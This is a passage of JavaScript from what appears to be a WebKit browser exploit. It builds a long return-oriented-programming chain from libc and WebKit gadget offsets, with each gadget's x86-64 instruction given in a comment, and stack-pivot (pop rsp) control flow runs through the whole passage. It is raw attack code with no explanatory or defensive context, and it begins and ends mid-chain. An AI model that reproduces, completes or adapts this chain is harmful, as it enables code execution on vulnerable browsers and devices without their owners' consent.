libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+71552, //L138
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+71584, //L140
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+71536, //L137
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+71568, //L139
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L137:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L138:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L139:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L140:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+71680, //L142
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+71664, //L141
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L141:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L142:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L143:
db([65280, 0]); // 0xff00
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+71792, //L145
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L145:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
webkit_base+5236215, //and rax, rcx
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+772328 //pop rcx
]);
//L147:
db([8, 0]); // 0x8
set_gadget(libc_base+768796,); //pop rax
//L148:
db([8, 0]); // 0x8
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+71976, //L149
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L149:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+72032, //L151
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L151:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
webkit_base+72932, //or rax, rcx
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+72160, //L154
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L153:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L154:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+72264, //L157
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+72248, //L156
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L156:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L157:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+72424, //L160
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+72456, //L162
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+72408, //L159
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+72440, //L161
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L159:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L160:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L161:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L162:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+72552, //L164
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+72536, //L163
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L163:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L164:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+772328 //pop rcx
]);
//L165:
db([24, 0]); // 0x18
set_gadget(libc_base+768796,); //pop rax
//L166:
db([24, 0]); // 0x18
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+72704, //L167
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L167:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+72760, //L169
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L169:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
webkit_base+72932, //or rax, rcx
libc_base+713278, //pop rsi
ropchain+72896, //L173
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+72880, //L172
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L171:
db([32, 0]); // 0x20
set_gadget(webkit_base+3789839,); //pop r11
//L172:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L173:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+73016, //L174
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+73048, //L176
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+73032, //L175
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L174:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L175:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L176:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+73152, //L177
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+73168, //L178
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L177:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L178:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+73288, //L179
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+73272, //L180
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L180:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L179:
db([0, 0]); // 0x0
set_gadgets([
libc_base+713278, //pop rsi
ropchain+73376, //L182
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+73360, //L181
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L181:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L182:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+73480, //L183
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+73496, //L184
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L183:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L184:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+73616, //L185
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+73600, //L186
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L186:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L185:
db([0, 0]); // 0x0
//___builtin_bswap64:
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+73688, //L188
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
webkit_base+1420514 //pop r8
]);
//L188:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+73752, //L189
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
webkit_base+1420514 //pop r8
]);
//L189:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([16, 0]); // 0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+73848, //L192
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L191:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L192:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+73920, //L195
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L194:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+772328,); //pop rcx
//L195:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+2989859, //mov [rax], rcx
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L197:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+772328,); //pop rcx
//L198:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+74040, //L201
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L200:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L201:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+972324, //mov [rax], ecx
libc_base+713278, //pop rsi
ropchain+74096, //L203
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L203:
db([0, 0]); // 0x0
//L202:
set_gadgets([
libc_base+713278, //pop rsi
ropchain+74160, //L206
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L205:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+772328,); //pop rcx
//L206:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+74264, //L209
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+74248, //L208
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L208:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L209:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+74424, //L212
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+74456, //L214
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+74408, //L211
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+74440, //L213
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L211:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L212:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L213:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L214:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+74536, //L215
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+74552, //L216
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L215:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L216:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+74648, //L218
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+74632, //L217
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L217:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L218:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+74760, //L221
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L219:
db([4, 0]); // 0x4
set_gadget(libc_base+165442,); //pop rdi
//L220:
db([4, 0]); // 0x4
set_gadget(webkit_base+3789839,); //pop r11
//L221:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+74872, //L222
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+74904, //L224
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+74888, //L223
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L222:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L223:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L224:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
webkit_base+15055763, //cmp rax, rcx ; sete al
webkit_base+47019, //setl al
libc_base+232261, //movzx eax, al
libc_base+713278, //pop rsi
ropchain+75064, //L225
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+75096, //L227
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+75080, //L226
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L225:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L226:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L227:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+75240, //L231
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+75256, //L232
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+75224, //L230
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L229:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L230:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L231:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L232:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11809960, //cmp rax, rsi ; sete al
libc_base+232261, //movzx eax, al
webkit_base+426067, //shl rax, 3
libc_base+713278, //pop rsi
ropchain+75368, //L233+8
libc_base+507828, //add rax, rsi
libc_base+145226, //mov rax, [rax]
libc_base+713278, //pop rsi
ropchain+75360, //L233
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+489696 //pop rsp
]);
//L233:
db([0, 0]); // 0x0
set_gadgets([
ropchain+75384, //L233+24
ropchain+75400, //L228
libc_base+489696, //pop rsp
ropchain+75416, //L234
//L228:
libc_base+489696, //pop rsp
ropchain+86016, //L235
//L234:
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L236:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+772328,); //pop rcx
//L237:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+75552, //L240
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+75536, //L239
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L239:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L240:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+75696, //L244
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+75664, //L242
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+75680, //L243
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L242:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L243:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L244:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+75768, //L245
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L245:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+75824, //L247
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L247:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796 //pop rax
]);
//L249:
db([7, 0]); // 0x7
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+75968, //L251
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L250:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+772328,); //pop rcx
//L251:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+76072, //L254
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+76056, //L253
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L253:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L254:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+76232, //L257
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+76264, //L259
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+76216, //L256
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+76248, //L258
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L256:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L257:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L258:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L259:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+76376, //L260
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+76408, //L262
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+76392, //L261
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L260:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L261:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L262:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+844101, //sub rax, rcx ; sbb rdx, rcx
libc_base+713278, //pop rsi
ropchain+76520, //L263
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+76536, //L264
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L263:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L264:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+76624, //L265
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L265:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+76680, //L267
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L267:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+76824, //L270
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+76840, //L271
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+76808, //L269
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L269:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L270:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L271:
db([0, 0]); // 0x0
set_gadgets([
libc_base+229136, //mov al, [rdi]
libc_base+713278, //pop rsi
ropchain+77000, //L275
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+76968, //L273
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+76984, //L274
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L272:
db([24, 0]); // 0x18
set_gadget(libc_base+165442,); //pop rdi
//L273:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L274:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L275:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+77056, //L276
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+165442 //pop rdi
]);
//L276:
db([0, 0]); // 0x0
set_gadgets([
libc_base+288783, //sar edi, cl
libc_base+713278, //pop rsi
ropchain+77184, //L279
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+77200, //L280
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+77168, //L278
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L278:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L279:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L280:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+77360, //L284
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+77328, //L282
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+77344, //L283
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L281:
db([24, 0]); // 0x18
set_gadget(libc_base+165442,); //pop rdi
//L282:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L283:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L284:
db([0, 0]); // 0x0
set_gadgets([
